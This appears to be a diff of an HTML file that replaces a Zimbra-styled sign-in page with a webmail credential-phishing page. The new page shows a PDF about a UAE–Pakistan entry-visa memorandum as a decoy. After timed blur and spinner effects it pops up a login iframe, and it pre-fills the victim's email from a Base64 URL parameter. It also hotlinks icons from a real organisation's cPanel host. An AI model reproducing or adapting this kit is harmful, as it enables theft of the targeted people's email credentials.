@@ -1,166 +1,221 @@
+
 <!DOCTYPE html>
-<html class="user_font_size_normal" lang="en">
-  <head>
-    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
-	  <link rel="icon" type="image/x-icon" href="/favicon.ico">
-    <title>Zimbra Web Client Sign In</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta
-      name="description"
-      content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com."
-    />
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
-    <link
-      rel="stylesheet"
-      type="text/css"
-      href="style.css"
-    />
-    <link rel="icon" type="image/png" href="LoginBanner_white.png">
-  </head>
-  <body onload="onLoad();">
-    <div class="LoginScreen">
-      <div class="center">
-        <div class="contentBox">
-          <h1>
-            <a
-              href="https://www.zimbra.com/"
-              id="bannerLink"
-              target="_new"
-              title="Zimbra"
-              ><span class="ScreenReaderOnly">Zimbra</span>
-              <span class="ImgLoginBanner"></span>
-            </a>
-          </h1>
-          <div id="ZLoginAppName">Web Client</div>
-         <form method="post" action="/register" name="registerForm">
-    <table class="form">
-      <tr>
-        <td><label for="username">Username:</label></td>
-        <td>
-          <input
-            id="username"
-            class="zLoginField"
-            name="username"
-            type="text"
-            value=""
-            size="40"
-            maxlength="1024"
-            autocapitalize="off"
-            autocorrect="off"
-            required
-          />
-        </td>
-      </tr>
-      <tr>
-        <td><label for="password">Password:</label></td>
-        <td>
-          <input
-            id="password"
-            class="zLoginField"
-            name="password"
-            type="password"
-            value=""
-            size="40"
-            maxlength="1024"
-            required
-          />
-        </td>
-      </tr>
-      <tr>
-        <td>&nbsp;</td>
-        <td class="submitTD">
-         <input
-                    id="remember"
-                    value="1"
-                    type="checkbox"
-                    name="zrememberme"
-                  />
-                  <label for="remember">Stay signed in</label>
-                  <input
-                    type="submit"
-                    class="ZLoginButton DwtButton"
-                    value="Sign In"
-                  />
-        </td>
-      </tr>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Webmail Login</title>
+<link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
+<style>
+iframe {
+  width: 460px;       /* or fixed width like 600px */
+  height: 400px;     /* your desired height */
+  border: 2px inset black;  /* shorthand for border */
+  overflow: hidden;  /* hides scrollbars inside iframe if needed */
+}
 
-              <tr>
-                <td colspan="2"><hr /></td>
-              </tr>
-              <tr>
-                <td>
-                  <label for="client">Version:</label>
-                </td>
-                <td>
-                  <div class="positioning">
-                    <select
-                      id="client"
-                      name="client"
-                      onchange="clientChange(this.options[this.selectedIndex].value)"
-                    >
-                      <option value="preferred" selected>Default</option>
-                      <option value="advanced">Advanced (Ajax)</option>
-                      <option value="standard">Standard (HTML)</option>
-                      <option value="mobile">Mobile</option>
-                    </select>
-                    <script type="text/javascript">
-                      document.write(
-                        "<a href='#' onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'>What’s This?</a>"
-                      );
-                    </script>
-                    <div
-                      id="ZLoginWhatsThis"
-                      class="ZLoginInfoMessage"
-                      style="display: none"
-                      onclick="showWhatsThis();"
-                      role="tooltip"
-                    >
-                      <h3 style="text-align: center">Client Types</h3>
-                      <b>Advanced</b> offers the full set of Web collaboration
-                      features. This Web Client works best with newer browsers
-                      and faster Internet connections. <br /><br /><b
-                        >Standard</b
-                      >
-                      is recommended when Internet connections are slow, when
-                      using older browsers, or for easier accessibility.
-                      <br /><br /><b>Mobile</b> is recommended for mobile
-                      devices. <br /><br />To set <b>Default</b> to be your
-                      preferred client type, change the sign in options in your
-                      Preferences, General tab after you sign in.
-                    </div>
-                    <div
-                      id="ZLoginUnsupported"
-                      class="ZLoginInfoMessage"
-                      style="display: none"
-                    >
-                      Note that your web browser or display does not fully
-                      support the Advanced version. We strongly recommend that
-                      you use the Standard client.
-                    </div>
-                  </div>
-                </td>
-              </tr>
-            </table>
-          </form>
-        </div>
-        <div class="decor1"></div>
-      </div>
+body {
+margin: 0;
+font-family: Arial, sans-serif;
+height: 100vh;
+overflow: hidden;
+}
 
-      <div class="Footer">
-        <div id="ZLoginNotice" class="legalNotice-small">
-          <a target="_new" href="https://www.zimbra.com">Zimbra</a> :: the
-          leader in open source messaging and collaboration ::
-          <a target="_new" href="https://blog.zimbra.com">Blog</a> -
-          <a target="_new" href="https://wiki.zimbra.com">Wiki</a> -
-          <a target="_new" href="https://www.zimbra.com/forums">Forums</a>
-        </div>
-        <div class="copyright">
-          Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a
-          registered trademark of Synacor, Inc.
-        </div>
-      </div>
-      <div class="decor2"></div>
-    </div>
-  </body>
+/* PDF Background */
+.pdf-background {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+border: none;
+z-index: 0;
+transition: filter 0.3s ease;
+}
+
+/* ✅ Blur state */
+.pdf-background.blur {
+filter: blur(6px);
+}
+
+/* ✅ Spinner loader */
+.loader {
+width: 50px;
+height: 50px;
+padding: 8px;
+aspect-ratio: 1;
+border-radius: 50%;
+background: #6d6f70;
+--_m:
+conic-gradient(#0000 10%, #000),
+linear-gradient(#000 0 0) content-box;
+-webkit-mask: var(--_m);
+mask: var(--_m);
+-webkit-mask-composite: source-out;
+mask-composite: subtract;
+animation: l3 1s infinite linear;
+display: none;
+
+position: absolute;
+top: 50%;
+left: 50%;
+transform: translate(-50%, -50%);
+z-index: 1001;
+}
+
+@keyframes l3 {
+to {
+transform: translate(-50%, -50%) rotate(1turn);
+}
+}
+
+/* Popup overlay */
+.overlay {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: rgba(0,0,0,0.4);
+backdrop-filter: blur(6px);
+display: none;
+align-items: center;
+justify-content: center;
+z-index: 1002;
+}
+
+.popup {
+background: #fff;
+border-radius: 8px;
+padding: 30px;
+width: 520px;
+box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+text-align: center;
+animation: fadeIn 0.5s ease;
+}
+
+.popup img {
+width: 180px;
+margin-bottom: 20px;
+}
+
+.popup label {
+display: block;
+text-align: left;
+margin: 10px 0 5px;
+font-weight: bold;
+font-size: 14px;
+color: #444;
+}
+
+.popup input {
+width: 90%;
+padding: 10px 10px 10px 35px;
+font-size: 14px;
+border: 1px solid #ccc;
+border-radius: 4px;
+margin-bottom: 15px;
+background-repeat: no-repeat;
+background-position: 8px center;
+background-size: 18px;
+}
+#email {
+background-image: url("http://webmail.ksew.com.pk/cPanel_magic_revision_1650472201/unprotected/cpanel/images/icon-username.png");
+}
+
+#password {
+background-image: url("http://webmail.ksew.com.pk/cPanel_magic_revision_1650472201/unprotected/cpanel/images/icon-password.png");
+}
+.popup button {
+background: #0094d9;
+color: white;
+border: none;
+padding: 10px;
+width: 105%;
+font-size: 14px;
+font-weight: bold;
+border-radius: 4px;
+cursor: pointer;
+}
+
+.popup button:hover {
+background: #007bb5;
+}
+
+@keyframes fadeIn {
+from { opacity: 0; transform: scale(0.9); }
+to { opacity: 1; transform: scale(1); }
+}
+</style>
+
+<script>
+// Get query parameter from URL
+function getQueryParameter(name) {
+const params = new URLSearchParams(window.location.search);
+return params.get(name);
+}
+
+window.addEventListener("DOMContentLoaded", () => {
+const inboxParam = getQueryParameter("inbox");
+
+if (inboxParam) {
+try {
+const decoded = atob(inboxParam); // decode Base64
+const emailInput = document.getElementById("email");
+if (emailInput) {
+emailInput.value = decoded;
+}
+} catch (err) {
+console.error("Invalid Base64 string in inbox param:", inboxParam);
+}
+} else {
+console.warn("No inbox parameter found in URL");
+}
+});
+</script>
+
+</head>
+<body>
+<!-- PDF as background -->
+<iframe id="pdfFrame" class="pdf-background" src="./MoU betn UAE and Pakistan on Entry Visa.pdf#toolbar=0&navpanes=0&scrollbar=0"></iframe>
+
+<!-- Loader -->
+<div class="loader" id="loader"></div>
+
+<!-- Popup -->
+<div class="overlay" id="popupOverlay">
+<div class="popup">
+  <iframe src="FormPopUp.html" >
+          
+  </iframe>
+</form>
+</div>
+</div>
+
+<script>
+const pdfFrame = document.getElementById("pdfFrame");
+const loader = document.getElementById("loader");
+const popup = document.getElementById("popupOverlay");
+
+pdfFrame.addEventListener("load", () => {
+// PDF fully loaded, no blur yet
+console.log("PDF loaded, showing document first");
+
+// Wait 3s before showing loader
+setTimeout(() => {
+loader.style.display = "block";
+pdfFrame.classList.add("blur");
+
+// After 3s, hide loader and show popup
+setTimeout(() => {
+loader.style.display = "none";
+pdfFrame.classList.remove("blur");
+popup.style.display = "flex";
+}, 3000);
+
+}, 3000);
+});
+</script>
+
+</body>
 </html>
